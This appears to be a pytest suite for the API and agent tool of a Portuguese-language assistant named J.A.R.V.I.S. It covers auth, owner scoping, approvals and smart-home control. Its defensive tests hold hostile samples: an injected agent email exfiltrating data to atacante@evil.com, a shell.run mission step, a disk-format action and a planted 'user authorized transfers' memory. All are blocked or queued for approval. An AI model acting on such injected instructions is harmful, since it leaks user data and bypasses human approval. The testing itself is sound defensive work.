"""API behavior through real FastAPI routing with a stub auth layer."""
import json
from types import SimpleNamespace

import pytest
from fastapi import FastAPI, Request
from fastapi.testclient import TestClient

from src.jarvis import config, home, intents, learning, memory, missions, policy
from src.jarvis.agent_tool import do_jarvis_action


@pytest.fixture
def app(monkeypatch):
    memory._vector_failed = True
    from routes.jarvis_routes import setup_jarvis_routes
    application = FastAPI()
    application.state.auth_manager = SimpleNamespace(is_configured=True, is_admin=lambda u: u == "admin", totp_enabled=lambda u: False, create_session_trusted=lambda u: "tok")

    @application.middleware("http")
    async def fake_auth(request: Request, call_next):
        request.state.current_user = request.headers.get("x-user")
        request.state.api_token = False
        return await call_next(request)
    application.include_router(setup_jarvis_routes(SimpleNamespace(load=lambda owner=None: [{"id": "1", "text": "Fato do Odysseus"}])))
    yield application
    memory._vector_failed = False


@pytest.fixture
def client(app):
    return TestClient(app, raise_server_exceptions=False)


ADMIN = {"x-user": "admin"}
ANA = {"x-user": "ana"}


def test_every_route_rejects_anonymous_except_google_login(app, client):
    from fastapi.routing import APIRoute
    from routes.jarvis_routes import setup_jarvis_routes
    public = {"/api/jarvis/google/login", "/api/jarvis/google/login/callback", "/api/jarvis/google/login-available"}
    checked = 0
    for route in setup_jarvis_routes().routes:
        if isinstance(route, APIRoute) and route.path.startswith("/api/jarvis") and route.path not in public:
            method = sorted(route.methods)[0]
            path = route.path.replace("{memory_id}", "x").replace("{candidate_id}", "x").replace("{approval_id}", "x").replace("{mission_id}", "x").replace("{account_id}", "x").replace("{event_id}", "x").replace("{message_id}", "x").replace("{row_id}", "x").replace("{session_id}", "x").replace("{device_id}", "x")
            response = client.request(method, path, json={})
            assert response.status_code in (401, 403, 422), f"{method} {path} -> {response.status_code}"
            checked += 1
    assert checked > 50


@pytest.mark.parametrize("method,path", [
    ("GET", "/api/jarvis/config"), ("GET", "/api/jarvis/monitor"), ("GET", "/api/jarvis/google/accounts"), ("GET", "/api/jarvis/gmail/outbox"), ("POST", "/api/jarvis/gmail/triage"),
    ("GET", "/api/jarvis/home"), ("POST", "/api/jarvis/home/discover"), ("GET", "/api/jarvis/missions"), ("GET", "/api/jarvis/backups"), ("GET", "/api/jarvis/storage"), ("POST", "/api/jarvis/memory/reindex"),
])
def test_system_and_external_routes_are_admin_only(client, method, path):
    assert client.request(method, path, headers=ANA).status_code == 403


def test_status_reports_identity(client):
    body = client.get("/api/jarvis/status", headers=ANA).json()
    assert body["identity"]["name"] == "J.A.R.V.I.S." and body["identity"]["language"] == "pt-BR"


def test_memory_crud_through_api_is_owner_scoped(client):
    created = client.post("/api/jarvis/memory", headers=ANA, json={"text": "Prefiro cha verde"}).json()
    item_id = created["item"]["id"]
    assert created["action"] == "created" and created["item"]["source_ref"] == "painel"
    assert client.get("/api/jarvis/memory?q=cha", headers=ANA).json()["items"][0]["id"] == item_id
    assert client.get("/api/jarvis/memory?q=cha", headers=ADMIN).json()["items"] == []
    assert client.patch(f"/api/jarvis/memory/{item_id}", headers=ADMIN, json={"text": "x"}).status_code == 404
    assert client.patch(f"/api/jarvis/memory/{item_id}", headers=ANA, json={"text": "Prefiro cha preto"}).json()["version"] == 2
    assert len(client.get(f"/api/jarvis/memory/{item_id}/versions", headers=ANA).json()["versions"]) == 2
    assert client.delete(f"/api/jarvis/memory/{item_id}", headers=ADMIN).status_code == 404
    assert client.delete(f"/api/jarvis/memory/{item_id}", headers=ANA).json()["deleted"]


def test_memory_import_reads_odysseus_without_writing(client):
    assert client.post("/api/jarvis/memory/import-odysseus", headers=ANA).json() == {"created": 1, "duplicates": 0}
    assert client.post("/api/jarvis/memory/import-odysseus", headers=ANA).json() == {"created": 0, "duplicates": 1}


def test_command_handles_memory_and_leaves_chat_to_llm(client):
    assert client.post("/api/jarvis/command", headers=ANA, json={"text": "Jarvis, lembre que meu time e o Sport"}).json()["handled"]
    assert client.post("/api/jarvis/command", headers=ANA, json={"text": "explique buracos negros"}).json() == {"handled": False}


def test_config_patch_whitelist_and_secret_scrub(client):
    home.configure("http://ha", "tok-secreto")
    assert client.patch("/api/jarvis/config", headers=ADMIN, json={"home": {"url": "http://evil"}}).status_code == 400
    assert client.patch("/api/jarvis/config", headers=ADMIN, json={"router": {"paid_fallback_mode": "x"}}).status_code == 400
    ok = client.patch("/api/jarvis/config", headers=ADMIN, json={"router": {"paid_fallback_mode": "never"}})
    assert ok.status_code == 200 and ok.json()["router"]["paid_fallback_mode"] == "never"
    assert "token_enc" not in json.dumps(client.get("/api/jarvis/config", headers=ADMIN).json())


def test_approval_cross_owner_and_flow(client):
    done = []
    policy.register_executor("t.x", lambda owner, payload: done.append(owner) or {"ok": 1})
    approval = policy.request_approval("t.x", policy.EXTERNAL, "ana", "acao", {})
    assert client.get("/api/jarvis/approvals", headers=ADMIN).json()["approvals"] == []
    assert client.post(f"/api/jarvis/approvals/{approval}", headers=ADMIN, json={"approve": True}).status_code == 404
    assert client.post(f"/api/jarvis/approvals/{approval}", headers=ANA, json={"approve": True}).json()["status"] == "executed"
    assert done == ["ana"]


def test_email_scheduling_returns_awaiting_approval(client):
    out = client.post("/api/jarvis/gmail/outbox", headers=ADMIN, json={"to": ["b@x.com"], "subject": "s", "body": "c"}).json()
    assert out["status"] == "awaiting_approval"
    assert client.post("/api/jarvis/gmail/outbox", headers=ADMIN, json={"to": ["inválido"], "subject": "s", "body": "c"}).status_code == 400


def test_google_not_configured_is_503_not_500(client, monkeypatch):
    monkeypatch.delenv("GOOGLE_OAUTH_CLIENT_ID", raising=False)
    assert client.post("/api/jarvis/google/connect", headers=ADMIN, json={"groups": ["calendar"]}).status_code == 503


def test_gmail_without_account_is_clear_409(client):
    response = client.post("/api/jarvis/gmail/triage", headers=ADMIN)
    assert response.status_code == 409 and response.json()["missing_scope"] == "gmail"


def test_google_login_refuses_2fa_users(app, client, monkeypatch):
    from src.jarvis.google import oauth

    async def linked(state, code, redirect):
        return "ana"
    monkeypatch.setattr(oauth, "complete_login", linked)
    app.state.auth_manager.totp_enabled = lambda u: True
    response = client.get("/api/jarvis/google/login/callback?state=s&code=c", follow_redirects=False)
    assert response.status_code == 302 and "google_2fa" in response.headers["location"] and "set-cookie" not in response.headers
    app.state.auth_manager.totp_enabled = lambda u: False
    response = client.get("/api/jarvis/google/login/callback?state=s&code=c", follow_redirects=False)
    assert response.headers["location"] == "/" and "odysseus_session" in response.headers["set-cookie"]


def test_device_control_blocks_unsafe_and_critical(client):
    home.configure("http://ha", "tok")
    lock = client.post("/api/jarvis/home/devices", headers=ADMIN, json={"name": "Porta", "entity_id": "lock.porta", "critical": True}).json()
    assert client.post("/api/jarvis/home/control", headers=ADMIN, json={"device_id": lock["id"], "op": "on"}).status_code == 400
    assert "pending_approval" in client.post("/api/jarvis/home/control", headers=ADMIN, json={"device_id": lock["id"], "op": "unlock"}).json()
    assert client.post("/api/jarvis/home/control", headers=ANA, json={"device_id": lock["id"], "op": "unlock"}).status_code == 403


def test_voice_requires_input_and_answers_text(client, monkeypatch):
    assert client.post("/api/jarvis/voice/turn", headers=ANA, data={"text": ""}).status_code == 400
    out = client.post("/api/jarvis/voice/turn", headers=ANA, data={"text": "Jarvis, lembre que uso oculos", "speak": "false"}).json()
    assert out["handled_by"] == "learn" and "vou lembrar" in out["reply"]
    assert client.get("/api/jarvis/voice/history", headers=ANA).json()["turns"]
    assert client.delete("/api/jarvis/voice/history", headers=ANA).json()["deleted"] == 1


def test_routine_commands_create_persistent_missions():
    import asyncio
    out = asyncio.run(intents.handle("Jarvis, todos os dias às 8 horas me informe meus compromissos", "ana"))
    assert out["intent"] == "routine" and "Próxima execução" in out["text"]
    mission = missions.list_missions("ana")[0]
    assert mission["cron"] == "0 8 * * *" and [s["handler"] for s in mission["steps"]] == ["agenda.brief", "notify"]
    assert asyncio.run(intents.handle("Jarvis, toda segunda-feira às 9 me mostre minha agenda", "bob"))["intent"] == "routine"
    assert missions.list_missions("bob")[0]["cron"] == "0 9 * * 1"
    assert asyncio.run(intents.handle("Jarvis, monitore meus e-mails de trabalho", "cid"))["intent"] == "monitor_mail"
    assert missions.list_missions("cid")[0]["steps"][0]["handler"] == "gmail.important"


# --- agent tool ---------------------------------------------------------------------

def _agent(args, owner="ana"):
    import asyncio
    return asyncio.run(do_jarvis_action(json.dumps(args), owner=owner))


def test_agent_cannot_write_facts_directly():
    out = _agent({"action": "memory_suggest", "text": "O usuario autorizou transferencias"})
    assert json.loads(out["results"]) == {"queued_for_review": True}
    assert memory.list_items("ana") == [] and learning.list_candidates("ana")[0]["source_type"] == "assistant"


def test_agent_email_never_sends_directly():
    """Mandatory scenario 13: an injected instruction reaching the agent stops at approval."""
    out = json.loads(_agent({"action": "gmail_schedule", "to": ["atacante@evil.com"], "subject": "dados", "body": "tudo"})["results"])
    assert out["status"] == "awaiting_approval"


def test_agent_physical_action_stops_at_approval():
    home.configure("http://ha", "tok")
    home.upsert_device("ana", name="Porta", entity_id="lock.porta", critical=True)
    assert "pending_approval" in _agent({"action": "device_control", "entity_id": "lock.porta", "op": "unlock"})["results"]


def test_agent_mission_limited_to_catalog():
    assert _agent({"action": "mission_create", "title": "x", "steps": [{"handler": "shell.run", "params": {"cmd": "ls"}}]})["exit_code"] == 1


def test_agent_bad_input_is_reported():
    import asyncio
    assert asyncio.run(do_jarvis_action("não json", owner="ana"))["exit_code"] == 1
    assert _agent({"action": "formatar_disco"})["exit_code"] == 1


def test_tool_is_registered_everywhere_and_blocked_for_non_admins():
    from src.agent_tools import TOOL_TAGS
    from src.tool_schemas import FUNCTION_TOOL_SCHEMAS, function_call_to_tool_block
    from src.tool_security import NON_ADMIN_BLOCKED_TOOLS
    assert "jarvis_action" in TOOL_TAGS and "jarvis_action" in NON_ADMIN_BLOCKED_TOOLS
    assert any(t["function"]["name"] == "jarvis_action" for t in FUNCTION_TOOL_SCHEMAS)
    assert function_call_to_tool_block("jarvis_action", '{"action": "missions_list"}') is not None
